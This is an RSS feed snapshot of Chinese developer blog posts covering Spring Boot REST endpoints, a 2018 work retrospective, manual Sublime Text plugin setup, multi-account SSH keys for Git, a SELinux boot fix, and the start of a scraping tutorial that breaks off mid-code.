<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>Spring Boot 2.x （十）：构建优雅的RESTful接口 - Vi的技术博客</title>
<link>http://www.cnblogs.com/viyoung/p/10317827.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/viyoung/p/10317827.html</guid>
<description>&lt;h3 id=&quot;restful&quot;&gt;RESTful&lt;/h3&gt;
&lt;p&gt;相信在座的各位对于RESTful都是略有耳闻，那么RESTful到底是什么呢？&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;REST（Representational State Transfer）表述性状态转移是一组架构约束条件和原则。满足这些约束条件和原则的应用程序或设计就是RESTful。需要注意的是，REST是&lt;strong&gt;设计风格而不是标准&lt;/strong&gt;。REST通常基于使用HTTP，URI，和XML（标准通用标记语言下的一个子集）以及HTML（标准通用标记语言下的一个应用）这些现有的广泛流行的协议和标准。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也许这段话有些晦涩难懂，换个角度我们来解释一下RESTful。&lt;/p&gt;
&lt;p&gt;首先来看一组例子：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//查询所有人员（传统）
localhost:8088/api/user/findAll 请求方式：GET
//查询所有人员（RESTful）
localhost:8088/api/users    请求方式：GET

//修改人员（传统）
localhost:8088/api/user/update 请求方式：POST
//修改人员（RESTful）
localhost:8088/api/users    请求方式：PUT

//添加人员（传统）
localhost:8088/api/user/add 请求方式：POST
//添加人员（RESTful）
localhost:8088/api/users    请求方式：POST

//删除人员（传统）
localhost:8088/api/user/delete  请求方式：DELETE
//删除人员（RESTful）
localhost:8088/api/users    请求方式：DELETE&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们通常称地址栏中输入的地址为URI（Uniform Resource Identifier），翻译成中文就是&lt;strong&gt;统一资源标识符&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;资源&lt;/strong&gt;，我们在浏览器页面上看到的东西都可以称之为资源，比如图片，文字，语音等等。&lt;/p&gt;
&lt;p&gt;而URI就是用于定位这些资源的位置的，RESTful风格的接口中只出现了表示资源的名词，关于这个资源的操作，通过HTTP内置的几种请求类型来区分。同一个路径&lt;code&gt;localhost:8088/api/users&lt;/code&gt;，因为请求方式的不同，而去找寻不同的接口，完成对资源状态的转变。&lt;/p&gt;
&lt;p&gt;总结一下，&lt;strong&gt;REST就是指对同一个URI的资源的不同请求方式（GET，POST，PUT，DELETE）（表述）下的做出的不同的操作（查，增，改，删），改变的是资源的状态，即表述性状态转移。 一个符合REST风格的URI就可以称之一个RESTful的接口。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;看到这里，相信RESTful已经了解的差不多了，下面我们来看看在Spring Boot中如何去使用&lt;/p&gt;
&lt;h3 id=&quot;springmvc-构建restful接口&quot;&gt;SpringMVC 构建RESTful接口&lt;/h3&gt;
&lt;p&gt;SpringMVC中给我们提供了一些注解，可以帮助我们去构建RESTful的接口，下面来直接看代码：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;package indi.viyoung.viboot.restful.controller;

import indi.viyoung.viboot.restful.entity.User;
import indi.viyoung.viboot.restful.service.UserService;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import java.util.List;

/**
 * &amp;lt;p&amp;gt;
 *  前端控制器
 * &amp;lt;/p&amp;gt;
 *
 * @author viyoung
 * @since 2019-01-23
 */
@RestController
@RequestMapping(&quot;/users&quot;)
@Slf4j
@CrossOrigin
public class UserController {

    @Autowired
    private UserService userService;

    @GetMapping
    public List&amp;lt;User&amp;gt; get() {
        log.info(&quot;GET方法执行。。。&quot;);
        return userService.list();
    }

    @GetMapping(value = &quot;/{id}&quot;)
    public User get(@PathVariable String id) {
        log.info(&quot;GET..{}...方法执行。。。&quot;,id);
        return userService.getById(id);
    }

    @PostMapping
    public void post() {
        log.info(&quot;POST方法执行。。。&quot;);
    }

    @PutMapping
    public void put() {
        log.info(&quot;PUT方法执行。。。&quot;);
    }

    @DeleteMapping
    public void delete() {
        log.info(&quot;DELETE方法执行。。。&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的工程创建可以参照&lt;a href=&quot;https://www.cnblogs.com/viyoung/p/10170807.html&quot;&gt;Spring Boot 2.x（五）：Mybatis-Plus + Spring Boot&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;下面我们也许需要一个前端的工程或者POSTMAN等测试接口的工具来发送不同的请求，我这里已经写好了一个前端的基于vue的工程，有需要的可以去下载一下：&lt;a href=&quot;https://github.com/viyog/viboot-front&quot;&gt;viboot-front&lt;/a&gt;。记得顺手点个star哟~&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190124170158203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ZpX3lvdW5nXzk1,size_16,color_FFFFFF,t_70&quot;/&gt;&lt;br/&gt;依次点击这五个按钮，可以看到后台的控制台分别打印出了不同的语句：&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2019012417050576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ZpX3lvdW5nXzk1,size_16,color_FFFFFF,t_70&quot;/&gt;&lt;br/&gt;原创文章，才疏学浅，如有不对之处，万望告知！&lt;/p&gt;
&lt;h3 id=&quot;公众号&quot;&gt;公众号&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/10641481-564fde3219454ceb.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;p&gt;您的推荐就是对我最大的支持！&lt;/p&gt;
</description>
<pubDate>Thu, 24 Jan 2019 22:57:00 +0000</pubDate>
<dc:creator>Vi的技术博客</dc:creator>
<og:description>RESTful 相信在座的各位对于RESTful都是略有耳闻，那么RESTful到底是什么呢？ REST（Representational State Transfer）表述性状态转移是一组架构约束条</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/viyoung/p/10317827.html</dc:identifier>
</item>
<item>
<title>这一年在非洲（4年一轮回总结完结） - Sean_Xiao</title>
<link>http://www.cnblogs.com/huige-you/p/10316398.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/huige-you/p/10316398.html</guid>
<description>&lt;p&gt;&lt;span&gt;继4年一轮回前后2篇，这篇为2018年总结做个收尾。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;--------2017年12月&lt;/p&gt;
&lt;p&gt;　　OTT行业在国内，版权、流量、运营砸钱已是穷途末路。一个故事概括，有个荒漠发现一口油井并启动开采，然后有人在旁边开了一个加油站，生意很好，在国内肯定是会有第二家、第三家...n家加油站出现，最后都生存不下去留下最大的那个吞并所有；在国外一般是会出现餐厅、修理厂、学校...最终这里会变成一个石油小镇。&lt;br/&gt;　　公司也快速完成转型方案，集团公司制，研发中心为子公司研发项目需求，集中公共资源，各子公司谋出路。&lt;br/&gt;　　老板在非洲看中能源项目，需要市场、销售、研发派人去当地考察需求和对应资源解决方案，当时研发中心觉得我各方面比较合适，就申请把我从CK子公司调回，再三考虑下，最终决定代表研发中心踏上非洲（尼日利亚）考察之旅。&lt;/p&gt;
&lt;p&gt;　　全程飞19个小时，和国内有7个小时的时差（国内中午12点，那边才早上5点），简单分享一下这趟旅程。避免写成了游记，这里就不过多的贴照片和细节了，如果感兴趣可以留言我可以在其他平台写一篇游记。&lt;/p&gt;
&lt;p&gt;　　从香港国际机场到多哈转机&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/602665/201901/602665-20190124190749443-264747724.png&quot; alt=&quot;&quot; width=&quot;489&quot; height=&quot;359&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　这是在飞机上吃的（没注意早中晚餐，反正几小时吃一餐，吃的都差不多）&lt;/p&gt;
&lt;p&gt; 　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/602665/201901/602665-20190124191237565-666070175.png&quot; alt=&quot;&quot; width=&quot;543&quot; height=&quot;403&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　再从多哈出发到尼日利亚的前经济首都拉各斯(Lagos)国际机场&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/602665/201901/602665-20190124191444114-1338203047.png&quot; alt=&quot;&quot; width=&quot;530&quot; height=&quot;399&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　贴几张当地照片&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/602665/201901/602665-20190124191545411-1528785285.png&quot; alt=&quot;&quot; width=&quot;315&quot; height=&quot;419&quot;/&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/602665/201901/602665-20190124191616017-1519360104.png&quot; alt=&quot;&quot; width=&quot;547&quot; height=&quot;402&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　在尼日利亚考察2周后，再从尼日利亚到肯尼亚的内罗毕国际机场&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/602665/201901/602665-20190124191756936-1690648296.png&quot; alt=&quot;&quot; width=&quot;410&quot; height=&quot;295&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　肯尼亚的条件和环境比尼日利亚要好很多，毕竟是旅游国家，然后再回国，不过多贴图&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/602665/201901/602665-20190124191948540-1093644793.png&quot; alt=&quot;&quot; width=&quot;447&quot; height=&quot;334&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/602665/201901/602665-20190124192023721-815205254.png&quot; alt=&quot;&quot; width=&quot;468&quot; height=&quot;304&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/602665/201901/602665-20190124192638759-526997539.png&quot; alt=&quot;&quot; width=&quot;544&quot; height=&quot;303&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　这一趟主要是了解当地（农村、城镇）对我们目标产品的供需情况和整个资源环境（支付、物流、网络等等）。&lt;/p&gt;
&lt;p&gt;　　大致结论：&lt;/p&gt;
&lt;p&gt;　　　　尼日利亚人口近2亿，对能源产品绝对的刚需，农村非常穷，网络条件和基建非常差，没有几条像样的路；&lt;/p&gt;
&lt;p&gt;　　　　大部分人都没有智能手机，绝大部分农村没有通电，城镇每天通电也只有三四个小时，但是基本上都有功能机（省电，待机长）；&lt;/p&gt;
&lt;p&gt;　　　　支付大部分是现金，整体跟国内四五十年代差不多，当地人不能接触现金（有现金基本上就100%跑路了），没有支付宝、微信这类便捷的第三方支付，各大银行相对保守，效率非常低，经常银行系统瘫痪停止服务；&lt;/p&gt;
&lt;p&gt;　　　　肯尼亚之行主要是参考销售模式，以及购买了部分竞品回国，这里不做细述。&lt;/p&gt;
&lt;p&gt;　　2018年1月初回国后进行了需求分析和讨论，大方向的需求：&lt;/p&gt;
&lt;p&gt;　　　　做一款在低网络资源环境下支持销售员押金备货和买货备货、销售、分期支付、短信发送激活码和设备控制的系统（这句话就是原始需求）。&lt;/p&gt;

&lt;p&gt;--------2018年1月中&lt;/p&gt;
&lt;p&gt;　　确定需求后，打包家当回长沙研发中心（期间也出过差回长沙、深圳参加年会和项目立项），一别奋斗了7年多任买不起房的深圳，多少有点不舍~~~&lt;/p&gt;
&lt;p&gt;　　从30多℃的非洲到20多℃的深圳，然后再到当时-2℃的长沙，临近春节没买到高铁票，通宵坐绿皮火车，一下火车就开始抖，放完行李赶往公司。&lt;/p&gt;
&lt;p&gt;　　组织全员会议，分享了这次调研结果和原始需求，并开始项目命名（PC项目）撰写项目立项文档和主导需求设计相关文档，确定了研发团队和设计团队成员。&lt;/p&gt;
&lt;p&gt;　　回长沙主要担任分公司副总监、PC项目经理、测试开发部门经理和兼管业务开发部，并完成DevOps体系建立、实施。&lt;/p&gt;
&lt;p&gt;　　3月份我们完成了V1.0版本的研发和演示，基本满足了原始需求，可以支持正常销售，工厂投产的第一批产品飘洋过海后开始销售。&lt;/p&gt;
&lt;p&gt;　　由于当地支付环境非常特殊，系统只是采取解析银行到账短信和邮件的方式（用户转账到指定账户，然后系统解析该账户的到账短信和邮件），这种方式存在很大的漏洞和安全隐患，所以3月下旬又去了一趟尼日利亚专门考察支付。&lt;/p&gt;
&lt;p&gt;　　这次是从香港出发到迪拜转机到Lagos，然后再原路返回，具体细节不细述。&lt;/p&gt;
&lt;p&gt;　　拜访了当地华为、传音、思达等国内企业，确定了对接的第三方支付这条路，回国后又派了其他同事3个月轮换的短期常驻尼日利亚，进行第三方支付对接沟通、其他支付途径挖掘和需求沟通、现场运维等工作。&lt;/p&gt;
&lt;p&gt;　　然后我们PC项目按每2周或1个月的节奏发布了V1.2、V1.3.x、V1.4.x等十多个迭代版本，以及仓储系统上线，不断适应当地销售场景。其中也有折腾，最终还是完成了系统支撑使命。包括低电压设备机房、短信猫搭建等等就不细说了。&lt;/p&gt;

&lt;p&gt;　　这一整年，从研发中心驱动整个销售模式、支付模式、业务流程，到当地销售摸索，最终形成了有效的需求反馈和响应机制，团队磨合也在渐渐步入正轨，目前新产品销量有所起色，新的销售模式也在尝试和验证。&lt;/p&gt;
&lt;p&gt;　　下半年，由于C02项目没有找到合适的客户，主营业务变更、技术栈调整和一些政策收紧调整，原长沙团队几乎全部离职，总部社招配额收紧，整个团队缩小近一半。当前团队交付模式已经固化，我也交出项目管理工作，顶上核心研发离职空缺，加入到具体的设计和核心功能研发工作当中。&lt;/p&gt;
&lt;p&gt;　　这一整年，原来纯测试部门打造成了测试开发部，完成2800+自动化测试用例的编写（成功率达99%），并且完成所有项目测试工作、主导项目发布和线上运维工作。团队70%是今年的毕业生，2个老员工是新学的编程。&lt;/p&gt;
&lt;p&gt;　　这一整年，我制定了DevOps_V1.0规范，并全部实施达成，并过渡出DevOps_V2.0目标，从需求到代码，从代码到交付自动化流水线的全流程固化。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/602665/201901/602665-20190124233602775-1691999548.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　这一整年经历太多，突然从普通项目管理拔高到多部门管理的副总监，项目、部门、设计、研发、需求沟通、方案预研并行太多事务，也导致上级认为高度不够，不适合做管理，最终年底考评结果并不理想。至今都没想明白做了这么多、输出这么多错在哪里，我权责下放也要下面的兄弟搞得定，所有流程制定也要有人带头实施，团队需要放心靠谱的人~~。&lt;/p&gt;
&lt;p&gt;　　兼顾研发工作而不陷入具体细节根本做不出带头大哥的质量，太陷入细节根本做不好管理。&lt;/p&gt;

&lt;p&gt;　　下阶段大致规划：&lt;/p&gt;
&lt;p&gt;　　2019年培养核心编码员工，不参与具体代码工作；&lt;/p&gt;
&lt;p&gt;　　抓业务开发部效率、质量和测试开发部效率、自动化测试目标，输出应对方案并固化流程；&lt;/p&gt;
&lt;p&gt;　　节省运维成本&lt;/p&gt;
&lt;p&gt;　　深入业务需求，引导系统方向.......&lt;/p&gt;

&lt;p&gt;回想这8年多摸爬滚打的经历，确实该好好沉下来了。行万里路，别忘了读万卷书。&lt;/p&gt;

</description>
<pubDate>Thu, 24 Jan 2019 17:00:00 +0000</pubDate>
<dc:creator>Sean_Xiao</dc:creator>
<og:description>继4年一轮回前后2篇，这篇为2018年总结做个收尾。 2017年12月 OTT行业在国内，版权、流量、运营砸钱已是穷途末路。一个故事概括，有个荒漠发现一口油井并启动开采，然后有人在旁边开了一个加油站，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/huige-you/p/10316398.html</dc:identifier>
</item>
<item>
<title>mac电脑sublime text3安装pretty json插件 - 小二郎，上学堂</title>
<link>http://www.cnblogs.com/zbrave/p/10317641.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zbrave/p/10317641.html</guid>
<description>&lt;p&gt;因&lt;a href=&quot;http://packagecontrol.io/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;http://packagecontrol.io/&lt;/a&gt;地址被墙无法实现自动安装，导致sublime Text3安装插件非常麻烦，总是出现There Are No Packages Available For Installation这样的错误提示信息，今天在网上试了n种解决方法终于实现了手动安装&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.首先安装install package&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 　　&lt;em&gt;&lt;strong&gt;资源地址：&lt;a href=&quot;https://download.csdn.net/download/qq_29154241/10937112&quot; target=&quot;_blank&quot;&gt;https://download.csdn.net/download/qq_29154241/10937112&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;　　包含两个文件： &lt;strong&gt;Package Control.sublime-package&lt;/strong&gt;，   &lt;strong&gt;channel_v3.json&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　a.将Package Control.sublime-package复制到 /Users/用户名/Library/Application Support/Sublime Text 3/Installed Packages目录下，如果已存在则替换&lt;/p&gt;
&lt;p&gt;　　　　然后重启应用&lt;/p&gt;
&lt;p&gt;　　b.将channel_v3.json放到任意目录，我的存放路径：/Users/mac/Work/channel_v3.json&lt;/p&gt;
&lt;p&gt;　　　　然后在应用中如图所示打开Setting-User&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1081914/201901/1081914-20190124233519725-1034640451.png&quot; alt=&quot;&quot; width=&quot;727&quot; height=&quot;267&quot;/&gt;&lt;/p&gt;

&lt;p&gt;添件如下内容：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&quot;channels&quot;&lt;span&gt;:
[
    &lt;/span&gt;&quot;/Users/mac/Work/channel_v3.json&quot;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;文件存放路径&lt;/span&gt;
]
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;如图：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1081914/201901/1081914-20190124233641022-239187849.png&quot; alt=&quot;&quot; width=&quot;671&quot; height=&quot;345&quot;/&gt;&lt;/p&gt;

&lt;p&gt;以上操作完成后 install package便安装成功，  就可以安装pretty Json 了&lt;/p&gt;
&lt;p&gt;使用 Command（或ctrl）+ Shift + P 调出面板，然后输入pci ，选中“Package Control: Install Package”并回车，然后通过输入插件的名字pretty json找到插件并回车安装即可。&lt;/p&gt;
&lt;p&gt;安装完成后使用command + ctrl + j快捷键来格式化当前页面的内容&lt;/p&gt;
&lt;p&gt;完美&lt;/p&gt;

</description>
<pubDate>Thu, 24 Jan 2019 16:02:00 +0000</pubDate>
<dc:creator>小二郎，上学堂</dc:creator>
<og:description>因http://packagecontrol.io/地址被墙无法实现自动安装，导致sublime Text3安装插件非常麻烦，总是出现There Are No Packages Available F</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zbrave/p/10317641.html</dc:identifier>
</item>
<item>
<title>同一台电脑上个人的github账户如何与公司的gitlab账户共存 - 炼心</title>
<link>http://www.cnblogs.com/hezhi/p/10317642.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hezhi/p/10317642.html</guid>
<description>&lt;p&gt;前些天，写了篇博客 &lt;a href=&quot;http://www.cnblogs.com/hezhi/p/开发环境之git：团队协作git工作流与常用命令&quot; class=&quot;uri&quot;&gt;开发环境之git：团队协作git工作流与常用命令&lt;/a&gt;。&lt;br/&gt;主要是回顾其中的第一小节基本配置。&lt;br/&gt;但是对于很多程序员而言，我们不仅有公司的gitlab账户做公司的业务，也会有自己个人的github账户整理自己的学习代码，如何在同一台电脑上让这两个账户共存？&lt;/p&gt;
&lt;h3 id=&quot;一.-先来看看你可能想到的方式&quot;&gt;一. 先来看看你可能想到的方式：&lt;/h3&gt;
&lt;p&gt;1.1 直接把之前生成的 ~/.ssh/id_rsa.pub 文件用类似的方式添加到github网站上。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;右上角点击头像 --&amp;gt; 点击settings --&amp;gt; 点击 SSH and GPG keys --&amp;gt; 点击 New SSH key --&amp;gt; 粘贴 id_rsa.pub&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当你发现你用ssh的方式拉取github仓库的时候&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; git clone git@github.com:用户名/仓库名.git&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;会提示&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Cloning into '仓库名'...
ERROR: Repository not found.
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;想想也是，仔细看id_rsa.pub文件 后面跟的是公司邮箱的地址，而你的github账户是你自己私人邮箱的地址，两个服务器明显都不在一起，鉴权和验证都是分开的。这种方式是不行的。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;1.2. 不管了，那直接用https的方式总可以吧，可以是可以，但是https的弊端大部分人也都清楚，每次推送代码都需要输入你的github账户名和密码了，这样很烦&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;1.3. 重新设置下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; git config --global user.name &quot;github用户名&quot;
 git config --global user.email &quot;github邮箱&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样貌似可行？（没亲自试过），但有可能正在自己的github项目中练手，突然公司项目来了个新bug，你就又要重新设置成公司的用户名邮箱什么的，经常需要这样来回切就有点烦&lt;/p&gt;
&lt;h3 id=&quot;二一劳永逸的方式&quot;&gt;二、一劳永逸的方式&lt;/h3&gt;
&lt;p&gt;之前公司的gitlab账户的ssh key 是正常的，那就先不管他了，其实我们要做的就只是再去生成一个新的ssh key 添加到 github账户上而已。&lt;/p&gt;
&lt;p&gt;2.1. 生成一个github的ssh key&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ssh-keygen -t rsa -C &quot;你的github邮箱&quot; -f ~/.ssh/github_rsa&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;2.2. 输入上面的命令后一路回车，然后到 ~/.ssh 目录下去找，会发现多了两个文件 github_rsa 和 github_rsa.pub。 把github_rsa.pub 按照 1.1 的方式添加到github中去&lt;/p&gt;
&lt;p&gt;2.3 在~/.ssh/目录下创建一个config文件，分别配置公司gitlab的ssh key 和 自己个人的 ssh key&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Host gitlab
    HostName 公司的代码仓库服务器地址
    User gitlab用户名
    IdentityFile ~/.ssh/id_rsa
Host github.com
    HostName github.com
    User github用户名
    IdentityFile ~/.ssh/github_rsa  &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其实这里的User并不会有我们预期的效果，比如你在公司的gitlab用户名一般会取实名的名字，而github是一个随意的昵称。这里并不会让你以后推送代码到gitlab时取 你在这里配置的 gitlab用户名，同样也不会推送到github时取你在这里配置的 github用户名。因为这个其实只是针对ssh key的配置的User，并不会影响你之前通过 git config --global user.name &quot;公司gitlab用户名&quot; 设置的git账户名&lt;/p&gt;
&lt;p&gt;2.4 至此，可以分别测试一下了你的ssh 是否能连通了&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ssh -T git@gitlab
ssh -T git@github.com&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果出现类似这样的字段就表明你的ssh key可以用了&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Hi XXX! You've successfully authenticated, but GitHub does not provide shell access.&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;2.5 强迫症的福音&lt;/p&gt;
&lt;p&gt;前面2.3中提到 ~/.ssh/config 文件中的User 并不等同于我们的git账户名。&lt;br/&gt;有可能你之前设置过&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;git config --global user.name &quot;公司gitlab实名&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后你发现你传代码到github的时候，也是显示的这个实名，让你觉得有点不爽。&lt;br/&gt;你可以继续到你本地的github仓库项目文件夹下去设置一个本地的用户名&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;git config --local user.name &quot;github用户名&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;再推送，就可以显示对应的用户名了。&lt;/p&gt;
&lt;p&gt;这里什么时候用global 什么时候用local 其实取决于你自己用哪个账户用得多一点，比如你在公司的电脑上，你就可以把公司的gitlab用户名加 --global 配置，而自己个人的github加 --local。如果你是在你自己家里的电脑上，就可以是相反的操作了。&lt;/p&gt;
</description>
<pubDate>Thu, 24 Jan 2019 16:02:00 +0000</pubDate>
<dc:creator>炼心</dc:creator>
<og:description>前些天，写了篇博客 '开发环境之git：团队协作git工作流与常用命令' 。 主要是回顾其中的第一小节基本配置。 但是对于很多程序员而言，我们不仅有公司的gitlab账户做公司的业务，也会有自己个人的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/hezhi/p/10317642.html</dc:identifier>
</item>
<item>
<title>RHEL因为selinux设置失误，无法重启问题。（centos适用） - f1烈日灼心</title>
<link>http://www.cnblogs.com/volac/p/10317621.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/volac/p/10317621.html</guid>
<description>&lt;p&gt;今天做FTP模拟的时候selinux设置出现失误。导致系统无法重新启动。出现如下界面&lt;/p&gt;
&lt;p&gt;Failed To Load SELinux policy.freezing &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1491231/201901/1491231-20190124230506102-664534996.png&quot; alt=&quot;&quot;/&gt;..&lt;/p&gt;
&lt;p&gt;网上找了下，解决方法如下：&lt;/p&gt;
&lt;p&gt;开机之后进入linux启动选择界面，停在平时启动的哪那一行按E键，进入grub编辑页面。&lt;/p&gt;
&lt;p&gt;在LANG=zh_CN.UTF-8 空格 加上 selinux=0或者 enforcing=0&lt;/p&gt;
&lt;p&gt;最后ctrl+x。&lt;/p&gt;
&lt;p&gt;此时熟悉的界面出现了，现在需要将执行错误的selinux参数改过来。SELINUX=enforcing 改为 ELINUX=disabled。reboot。完事！&lt;/p&gt;

</description>
<pubDate>Thu, 24 Jan 2019 15:48:00 +0000</pubDate>
<dc:creator>f1烈日灼心</dc:creator>
<og:description>今天做FTP模拟的时候selinux设置出现失误。导致系统无法重新启动。出现如下界面 Failed To Load SELinux policy.freezing .. 网上找了下，解决方法如下： 开</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/volac/p/10317621.html</dc:identifier>
</item>
<item>
<title>爬虫之数据解析的三种方式 - 温而新</title>
<link>http://www.cnblogs.com/peng104/p/10317601.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/peng104/p/10317601.html</guid>
<description>&lt;p&gt;re正则就不写了，前面已经写入一篇很详细的正则表达式模块了~&lt;/p&gt;
&lt;p&gt;而且，在爬虫中，下面两种方式用的多一些~&lt;/p&gt;
&lt;p&gt;正则表达式：&lt;a href=&quot;https://www.cnblogs.com/peng104/p/9619801.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/peng104/p/9619801.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;大致用法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
pattern = re.compile(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;dd&amp;gt;.*?board-index.*?&amp;gt;(\d+)&amp;lt;/i&amp;gt;.*?src=&quot;(.*?)&quot;.*?name&quot;&amp;gt;&amp;lt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
                     +&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.*?&amp;gt;(.*?)&amp;lt;/a&amp;gt;.*?star&quot;&amp;gt;(.*?)&amp;lt;/p&amp;gt;.*?releasetime&quot;&amp;gt;(.*?)&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
